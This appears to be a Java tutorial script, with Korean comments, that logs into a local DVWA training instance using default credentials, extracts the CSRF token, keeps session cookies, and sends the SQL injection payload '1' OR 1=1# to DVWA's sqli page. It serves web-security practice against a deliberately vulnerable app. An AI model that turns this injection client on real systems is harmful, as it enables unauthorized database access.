package TrafficAnomalyDetection.FDS.WebHackingTutorial;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.*;

public class SQLInjectionTrial {
    private static final String BASE_URL = "http://192.168.219.104/DVWA";
    private static final String LOGIN_URL = BASE_URL + "/login.php";
    private static final String ATTACK_URL = BASE_URL + "/vulnerabilities/sqli/";
    private static String csrfToken = null;
    
    public void run() throws Exception {
        // 쿠키 매니저 활성화 (자동 쿠키 관리)
        CookieManager cookieManager = new CookieManager();
        CookieHandler.setDefault(cookieManager);

        // 1️⃣ 로그인 및 세션 유지
        if (!login()) {
            System.out.println("로그인 실패! 공격 중단");
            return;
        }

        // 2️⃣ SQL Injection 공격 실행
        String payload = URLEncoder.encode("1' OR 1=1#", StandardCharsets.UTF_8) + "&Submit=Submit#";
        sendAttack(payload);
    }

    // ✅ 로그인 처리 (세션 유지)
    private boolean login() throws Exception {
        // 1️⃣ 로그인 페이지에서 CSRF 토큰 가져오기
        String loginPage = sendRequest(LOGIN_URL, "GET", null);
        csrfToken = extractCsrfToken(loginPage);
        if (csrfToken == null) {
            System.out.println("CSRF 토큰을 찾을 수 없습니다.");
            return false;
        }

        // 2️⃣ 로그인 요청 보내기
        String loginData = "username=admin&password=password&user_token=" + csrfToken + "&Login=Login";
        String loginResponse = sendRequest(LOGIN_URL, "POST", loginData);

        // ✅ [로그인 후 쿠키 확인]
        System.out.println("\n🔹 [로그인 후 저장된 쿠키 목록]");
        printCookies();  // 🔥 로그인 후 쿠키 확인

        // ✅ 응답 본문을 확인하여 로그인 성공 여부 판단
        if (loginResponse.contains("Welcome to Damn Vulnerable Web Application")) {
            System.out.println("✅ 로그인 성공!");
            return true;
        }

        System.out.println("❌ 로그인 실패! 응답 본문에 성공 메시지가 없음.");
        return false;
    }
    
    // ✅ Set-Cookie 값 가져오기
    private Map<String, List<String>> getResponseHeaders(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        return conn.getHeaderFields();
    }
    
    

    // ✅ SQL Injection 공격 요청
    private void sendAttack(String payload) throws Exception {
        String attackUrl = ATTACK_URL + "?id=" + payload;
        String response = sendRequest(attackUrl, "GET", null);
        System.out.println("공격 응답:" + response);
    }

 // ✅ 요청을 처리하는 공통 메서드 (GET/POST 지원)
    private String sendRequest(String urlString, String method, String postData) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod(method);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setRequestProperty("Accept", "text/html");

        // 🔥 현재 저장된 쿠키를 요청 헤더에 추가
        String cookies = getCookies();
        if (!cookies.isEmpty()) {
            conn.setRequestProperty("Cookie", cookies);
        }

        // 🔹 [요청] 헤더 확인 (연결 전)
        System.out.println("\n🔹 [요청: " + method + " " + urlString + "] Request Headers (연결 전):");
        conn.getRequestProperties().forEach((key, value) -> System.out.println(key + ": " + value));

        // 🔥 POST 요청 처리
        if ("POST".equals(method) && postData != null) {
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }
        }

        // 🔥 응답 읽기
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        // 🔹 응답 헤더 출력
        System.out.println("\n🔹 [응답 헤더]");
        Map<String, List<String>> responseHeaders = conn.getHeaderFields();
        responseHeaders.forEach((key, value) -> System.out.println(key + ": " + value));

        // 🔥 Set-Cookie 헤더를 수동으로 저장
        if (responseHeaders.containsKey("Set-Cookie")) {
            List<String> setCookies = responseHeaders.get("Set-Cookie");
            for (String cookie : setCookies) {
                storeCookie(cookie);
            }
        }

        return response.toString();
    }

    // ✅ 쿠키를 직접 저장하는 메서드
    private void storeCookie(String cookieString) {
        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
        CookieStore cookieStore = cookieManager.getCookieStore();

        // 🔥 Set-Cookie 값에서 쿠키 이름과 값을 추출하여 수동 저장
        String[] cookies = cookieString.split(";");
        for (String cookie : cookies) {
            String[] parts = cookie.split("=", 2);
            if (parts.length == 2) {
                HttpCookie httpCookie = new HttpCookie(parts[0].trim(), parts[1].trim());
                httpCookie.setDomain("192.168.219.104");  // 🔥 DVWA 서버 도메인 설정
                httpCookie.setPath("/DVWA/");            // 🔥 DVWA 경로 설정
                cookieStore.add(URI.create(BASE_URL), httpCookie);
            }
        }
    }

    // ✅ 현재 저장된 쿠키를 문자열로 변환 (요청에 넣을 때 사용)
    private String getCookies() {
        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
        CookieStore cookieStore = cookieManager.getCookieStore();

        StringBuilder cookieHeader = new StringBuilder();
        for (URI uri : cookieStore.getURIs()) {
            if (!uri.toString().contains("192.168.219.104")) continue; // 🔥 올바른 도메인인지 확인

            for (HttpCookie cookie : cookieStore.get(uri)) {
                if (cookieHeader.length() > 0) {
                    cookieHeader.append("; ");
                }
                cookieHeader.append(cookie.getName()).append("=").append(cookie.getValue());
            }
        }
        return cookieHeader.toString();
    }


    // ✅ CSRF 토큰 추출 메서드
    private String extractCsrfToken(String response) {
        Pattern pattern = Pattern.compile("name='user_token' value='(.*?)'");
        Matcher matcher = pattern.matcher(response);
        return matcher.find() ? matcher.group(1) : null;
    }
    
    // 쿠키 상태 확인
    private void printCookies() {
        CookieManager cookieManager = (CookieManager) CookieHandler.getDefault();
        CookieStore cookieStore = cookieManager.getCookieStore();

        System.out.println("\n🔹 [현재 저장된 쿠키 목록]");
        for (URI uri : cookieStore.getURIs()) {
            List<HttpCookie> cookies = cookieStore.get(uri);
            System.out.println("▶ " + uri);
            for (HttpCookie cookie : cookies) {
                System.out.println("   - " + cookie);
            }
        }
    }
}